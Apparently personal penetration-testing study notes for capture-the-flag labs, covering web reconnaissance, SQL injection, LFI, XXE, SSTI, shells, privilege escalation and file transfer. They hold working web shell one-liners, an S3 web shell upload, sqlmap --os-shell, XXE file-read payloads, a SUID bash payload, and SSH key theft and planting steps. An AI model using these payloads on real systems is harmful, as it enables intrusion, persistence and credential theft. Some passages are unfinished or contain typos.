| `get`        | Transfers a file or set of files from the remote host to the local host. |
| `put`        | Transfers a file or set of files from the local host onto the remote host. |
| `quit`       | Exits tftp.                                                  |
| `status`     | Shows the current status of tftp, including the current transfer  mode (ascii or binary), connection status, time-out value, and so on. |
| `verbose`    | Turns verbose mode, which displays additional information during file transfer, on or off. |

# Web

## Introduction

### **HTTP Request**

```
[METHOD] /[PATH]?p1=[val1]&p2=[val2] HTTP/[VERSION]`
`Host:  [example.com]`
`[Head1: Val1]`
`...
[PAYLOAD]
```

### **Parameters**

Parameters are very important to spot, and they are grouped in different categories:

- **REFLECTED**: 

  Parameters that are reflected, i.e. they appear in the request and in the response. 

  - Template Injection (server or client side)

  - XXS/HTML Injection 

- **FUNCTIONAL**: 

  They have a functional scope (they could be reflected or not).

  - LFI / RFI (file fetching is their function), 

  - SQL injection (query to a database e.g. a search-bar or a login),

  - SSRF (URL fetching), 

  - OS injection (command execution, execute commands on the server).


- **FORMATTED:** 

  Parameters that appear in JSON or XML format

  - SSPP

  - XXE


`paramfuzz(query_url)` to fuzz get parameters

## Enumeration

### Directories and files

Gbuster or Ffuf to discover hidden files or directories

```bash
gobuster dir -u {IP} -w {/usr/share/seclists/Discovery/Web-Content/WORDLIST}
```

-  **HTTP status code** 
   -  `200`  request was successful
   -  `403`  forbidden to access the resource.
   -  `301`  being redirected (not a failure case)

**Important files:**

- `.swp` *swap files:* 

  Swap files store the changes that are made to the buffer. If Vim or your computer crashes, the swap files allow you to recover those changes. Swap files also provide a way to avoid multiple instances of an editor from editing the same file.

  - `vim -r [swap file]` to read it
  - `strings [swap file]`  to only display the human-readable text if the file is unrecoverable

- **robots.txt** 

  It is common for websites to contain a `robots.txt` file,  whose purpose is to instruct search engine web crawlers such as  Googlebot which resources can and cannot be accessed for indexing. The `robots.txt` file can provide valuable information such as the location of private files and admin pages. 

### DNS Subdomains

1. Manual search:

   - **SSL certificate**

   - **DNS records**

     To display all the available DNS records:

     ```bash
     dig any [DOMAIN]
     ```

     The records output will be divided in categories:

     - `A` records: We recognize the IP addresses that point to a specific (sub)domain. 
     - `MX` records: show which mail  server is responsible for managing the emails for the company. 
     - `NS` records: show which name servers are used to resolve the FQDN to IP addresses. Most hosting  providers use their own name servers, making it easier to identify the hosting provider.
     - `TXT` records: often contains verification keys for different third-party providers and other security aspects of DNS, such as [SPF](https://datatracker.ietf.org/doc/html/rfc7208), [DMARC](https://datatracker.ietf.org/doc/html/rfc7489), and [DKIM](https://datatracker.ietf.org/doc/html/rfc6376), which are responsible for verifying and confirming the origin of the  emails sent.

   - **Certificate Transparency (CT) logs:**  SSL certificate providers share the CT with the website https://crt.sh/, which stores everything in a database.

     Certificate Transparency (CT) is an Internet security standard for monitoring and auditing the issuance of digital certificates. When an Internet user interacts with a website, a trusted third party  is needed for assurance that the website is legitimate and that the  website's encryption key is valid.

     To look them up from the terminal and filter by unique subdomains:

     ```bash
      curl -s https://crt.sh/\?q\=[DOMAIN]\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u | tee subdomainlist.txt
     ```

     Then one can grep the ones with an IP address:

     ```bash
     for i in $(cat subdomainlist);do host $i | grep "has address" | grep [DOMAIN]| cut -d" " -f4 >> ip-addresses.txt;done
     ```

     And use [Shodan](https://www.shodan.io/) to find devices and systems permanently connected to the Internet like `Internet of Things` (`IoT`). It searches the Internet for open TCP/IP ports and filters the systems according to specific terms and criteria.

     ```bash
     for i in $(cat ip-addresses.txt);do shodan host $i;done
     ```

     Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 

2. Fuzzing:

   ```bash
   ffuf -u "http://searcher.htb" -H "Host: FUZZ.searcher.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac -acs advanced -mc all
   ```

3. Add DNS Server to the `/etc/resolv.conf` file.

### Other Informations

- **Banner Grabbing**:

  - ```bash
    curl -IL {URL}
    ```

- **Eyewitness:** can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.

  - ```bash
    echo "{URLS}" > urls.txt 
    ```

  - ```bash
    eyewitness -f urls.txt -d screens
    ```

- **Whatweb:** We can extract the version of web servers, supporting frameworks, and applications

  - ```bash
    whatweb {IP}
    ```

- **SSL/TLS Certificates:**bviewing the certificate could reveal details, such as the email  address and company name. These could potentially be used to conduct a  *phishing attack*.

- **source code** `CRTL + U`

- **StaffL**

  - Employees can be identified on various business networks such as [LinkedIn](https://www.linkedin.com) or [Xing](https://www.xing.de). Job postings from companies can also tell us a lot about their  infrastructure and give us clues about what we should be looking for.
  - Github projects from employees could reveal personal information


### Cloud

`Amazon` (`AWS`), `Google` (`GCP`), and `Microsoft` (`Azure`) 

- DNS enumeration:

  Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 

- Google search:

- Third-party providers 

  -  [domain.glass](https://domain.glass) 
  -  [GrayHatWarfare](https://buckets.grayhatwarfare.com). We can do many different searches, discover AWS, Azure, and GCP cloud  storage, and even sort and filter by file format. Therefore, once we  have found them through Google, we can also search for them on  GrayHatWarefare and passively discover what files are stored on the  given cloud storage. SSH keys could be also leaked here.

#### Amazon Buckets

The are different types of subdomains, for example `s3.` are amazon buckets subdomains on the cloud. Always add the subdomains to the `/ets/hosts/` file next to the domain..

Use `awscli` to interact with them. 

To list the buckets:
`aws --endpoint=http://s3.thetoppers.htb s3 ls`

To list the objects inside the buckets just specify the bucket at the end of the previous command:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

If php files are shown, it means that the bucket is handling the php page. Thus creating an appropriate php file and coping it in the bucket, will open a shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

## Exploit

### Proxy

#### Host Misrouting

How to, given a domain, reach other subdomains with the same IP address. Thus, we want to brute force the “etc/hosts” file of the proxy.

After adding the domain to my `/etc/hosts` file:

```bash
gobuster vhost -u http://[DOMAIN] -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

Ignore any 400 Status output, since it means that the proxy refused your request.

### Server-side Injections

#### SQL Injections

Each time the user wants to log in, the web application sends the log-in page input to the SQL Service, comparing it with stored database entries for that specific user. 

 Post-log-in, the web application will set the user a special permission in the form of a cookie or authentication token that associates his online presence with his authenticated presence on the website. This cookie is stored both locally, on the user's browser storage, and the webserver.

**Vulnerability:** 

- Add  `'#` in the parameter

- Use sqlmap to confirm th

  ```bash
  sqlmap -u "http://[URL]?[QUERY]" -p [PARAM] search --dbs --level=5 --risk=3 --flush-session {--cookie=['COOKIE'] --dbms=[DATABASE]}```  
  ```

  - A common database to try MySQL or PosrGreSQL for php applications

  - To run code execution

    ```bash
    sqlmap -u "http://[URL]?[QUERY]" -p [PARAM] search --dbs {--cookie=['COOKIE'] --dbms=[DATABASE]}--os-shell
    ```



#### Local / Remote File Injection (LFI/RFI)

LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. 

A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code execution as well.

We test the page parameter to see if we can include files on the target system in the server response. We
will test with some commonly known files that will have the same name across networks, Windows
domains, and systems which can be found [`here`](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt).

One of the most common files that a penetration tester
might attempt to access on a Windows machine to verify LFI is the hosts file,
`WINDOWS\System32\drivers\etc\hosts` (this file aids in the local translation of host names to IP
addresses). The ../ string is used to traverse back a directory, one at a time. Thus multiple ../ strings are
included in the URL so that the file handler on the server traverses back to the base directory i.e. C:\

```
page=../../../../../../../../windows/system32/drivers/etc/hosts
```

For instance, the file inclusion can be made possible because in the backend the `include()` method of PHP is
being used.

In Linux, there is the `/etc/passwd` file.

For a **RFI** you load the file remotely, e.g. though a server.

#### XML Eternal Entities (XXE or XEE)

*XML* is a markup language  and file format for storing, transmitting, and reconstructing arbitrary data.  Although the design of XML focuses on documents, the language is widely used for the representation of arbitrary data structures, such as those used in web services.

*XML Entities* are a way of representing an item of data within an XML
document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities `&lt;` and `&gt;` represent the characters < and > .

An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. Note that a parser transforms raw data into a structured format.

Using Burpsuit responder, one can try to read a file to check if the XXE vulnerability is indeed possible:

```php
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "FILE"> ]>
<data>&example;</data>
```

- FILE:
  - Linux: `"/etc/passwd"`
  - Windows file: `'file"///c:/windows/win.ini'`
- data: vulnerable parameter, the *reflected* one.



#### Template Injection SSTI

**Template Engines** are used to display dynamically generated content on a web page. They replace the
variables inside a template file with actual values and display these values to the client.

**Server-side template injection** is a vulnerability where the attacker injects malicious input into a template in order
to execute commands on the server.

#### Identification of the template engine

![image-20240922190834802](/home/damuna/.config/Typora/typora-user-images/image-20240922190834802.png)

special characters commonly used in
template expressions:
`{{7*7}}`
`${7*7}`
`<%= 7*7 %>`
`${{7*7}}`
`#{7*7}`

Some of these payloads can also be seen in the previous image and are used to identify SSTI vulnerabilities.
If an SSTI exists, after submitting one of them, the web server will detect these expressions as valid code
and attempt to execute them, in this instance calculating the mathematical equation 7*7, which is equal to 49.
Even if the code is not directly executed, an error message can indicate what is the engine used. <then, go to Hacktrix.



#  Shells

![image-20241009151501371](/home/damuna/.config/Typora/typora-user-images/image-20241009151501371.png)

## Reverse Shell

[ReverseShellGenerator](https://www.revshells.com/)

## Bind Shell

Unlike a `Reverse Shell` that connects to us, we will have to connect to it on the `targets'` listening port.

We can use `netcat` to connect to that port and get a connection to the shell. Unlike a `Reverse Shell`, if we drop our connection to a bind shell for any reason, we can connect back to it and get another  connection immediately. However, if the bind shell command is stopped  for any reason, or if the remote host is rebooted, we would still lose  our access to the remote host and will have to exploit it again to gain  access.

## TTY Upgrade

Once we connect to a shell through Netcat, we will notice that we can  only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the  command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.

It could happen that the history of the shell is empty if the upgrade is not performed, and the history could contain important information, such as passwords.

### General method

```bash
script -qc /bin/bash /dev/null
```



### python/stty method

```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'	#usually good enough
Ctrl-Z	# Go to my Kali

# In Kali
$ stty raw -echo
$ fg	# Go to shell

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows [] columns []
```

## Web Shell

### Writing a Web Shell

A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.

**Code: php**

```php
<?php system($_REQUEST["cmd"]); ?>
```

**Code: jsp**

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**Code: asp**

```asp
<% eval request("cmd") %>
```

### Uploading a Web Shell

Now we have to write one of the web shells above in the web root

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
| `IIS`      | c:\inetpub\wwwroot\    |
| `XAMPP`    | C:\xampp\htdocs\       |

We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. 



### Accessing the Web Shell

Once we write our web shell, we can either access it through a browser or by using `cURL`. 

- We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:

- ```bash
  curl http://SERVER_IP:PORT/shell.php?cmd=id
  ```



Benefits:

- It would bypass any firewall  restriction in place, as it will not open a new connection on a port 
- If the compromised host is rebooted, the web shell would still be in place,  and we can access it and get command execution without exploiting the  remote host again.

Contra:

- Not as interactive

### Payload 

- **Bash**

  Copies bash, give SUID priviliges,

  ```bash
  echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/exp\nchmod 4777 /tmp/exp' > file_to_execute
  ```

  

# Privilege Escalation

One excellent resource is [HackTricks](https://book.hacktricks.xyz), which has an excellent checklist for both [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) and [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) local privilege escalation. 

## Scripts

- Linux
  - [Linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) (enum)
  -  [LinEnum](https://github.com/rebootuser/LinEnum.git) (enum)
  -  [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) (enum)
  - [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- Windows
  -  [Seatbelt](https://github.com/GhostPack/Seatbelt) (enum)
  -  [JAWS](https://github.com/411Hall/JAWS) (enum)
  - [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

## Linux

### Kernel Exploits

Unpatched/older versions of Linux/Windows

### Vulnerable Software

Installed software: we can use the `dpkg -l` command on Linux or look at `C:\Program Files` in Windows to see what software is installed on the system.

### User Privileges

- `sudo -l`: check sudo privileges
  - `sudo su` to switch to the root user `su [USER]` to switch to a local user
  - The `NOPASSWD` entry shows if a certain application can be executed without password
  - `sudo -u [USER] [COMMAND]` to execute an application as user and not as root
- Once we find a particular application we can run with `sudo`, we can look for ways to exploit it to get a shell as the root user. 
  - [GTFOBins](https://gtfobins.github.io) contains a list of commands and how they can be exploited through `sudo`. We can search for the application we have `sudo` privilege over, and if it exists, it may tell us the exact command we should execute to gain root access.
  - [LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to  leverage to perform certain functions, like downloading files or  executing commands in the context of a privileged user.

### Scheduled Tasks

Scripts that run at specific intervals to carry out a task. To take advantage:

- **Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.
  - `/etc/crontab`
  - `/etc/cron.d`
  - `/var/spool/cron/crontabs/root`

### Exposed Credentials

Next, we can look for files we can read and see if they contain any exposed credentials. Check:

- `configuration` files
- `log` files, 
-  `bash_history` 

Check for **Password Reuse**!! 

### SSH Keys

#### Read Access

If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server.

```bash
$ nano id_rsa	# open and copy on your machine
$ chmod 600 id_rsa	# More restrictive permission
$ ssh root@10.10.10.10 -i id_rsa
```

In windows they are in 

#### Write Access

We can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`.

```bash
ssh-keygen -f key	#Generate a key in the output file key
ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
ssh root@10.10.10.10 -i key	# Login
```



## Windows

### Kernel Exploits

Unpatched/older versions of Windows

### Vulnerable Software

Installed software: `C:\Program Files`  to see what software is installed on the system.

### User Privileges

- `whoami`
  - [LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to  leverage to perform certain functions, like downloading files or  executing commands in the context of a privileged user.
- check Desktop: `cd C:\Users\[USER]\Desktop`

### Scheduled Tasks

Scripts that run at specific intervals to carry out a task. To take advantage:

- **Add new scheduled task**
  - Linux: *Cron Jobs.* If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed.
    - `/etc/crontab`
    - `/etc/cron.d`
    - `/var/spool/cron/crontabs/root`

### Exposed Credentials

Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows).

Look at enum scripts at the beginning.

Check for `Password Reuse`!! 

### SSH Keys

#### Read Access

If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in  `file:///c:/users/[USERNAME]/.ssh/id_rsa`, and use it to log in to the server.

```bash
$ nano id_rsa	# open and copy on your machine
$ chmod 600 id_rsa	# More restrictive permission
$ ssh root@10.10.10.10 -i id_rsa
```

#### Write Access

We can place our public key in the user's ssh directory at `file:///c:/users/[USERNAME]/.ssh/authorized_keys`.

```bash
ssh-keygen -f key	#Generate a key in the output file key
ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
ssh root@10.10.10.10 -i key	# Login
```



# General Knowledge

## Transferring files

**wget/cURL to upload**

- On my machine, go on the directory containing the file in interest

- Run a server in it

  ```bash
  python3 -m http.server 8000	
  ```

  If the machine is very old it could be that the python server won't work. In this case for Windows one can use smb and host the current folder (if not specifies instead of `.`):

  ```bash
  smbsrver.py -ip [YOUR IP] share .
  ```

  Remotely you connect by:

  ```
  copy \\[YOUR IP]\share\[FILE] [OUTPUT_FILE]
  ```

- Download remotely

  ```bash
  curl [URL] -o [FILE_NAME]
  ```

**SCP**

If we have ssh credentials:

```bash
scp [FILE_NAME] user@remotehost:[FILE_PATH]
```

**Base64**

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from  downloading a file from our machine. 

We can encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it.

- Encode the file

```
base64 [FILE_NAME] -w 0
```

- Copy the string

- Go on the remote host, decode

  ```bash
  echo [STRING] | base64 -d > [FILE_NAME]
  ```

**Validate Transfer**

`file`: validates the format of a file

`md5sum` validates the hash of the filestomi

## Windows

## Google search

- `intext:*term*` restricts results to documents containing *`term`* in the text. 
-  `inurl:` in your query, Google will restrict the results to documents containing that word in the URL.
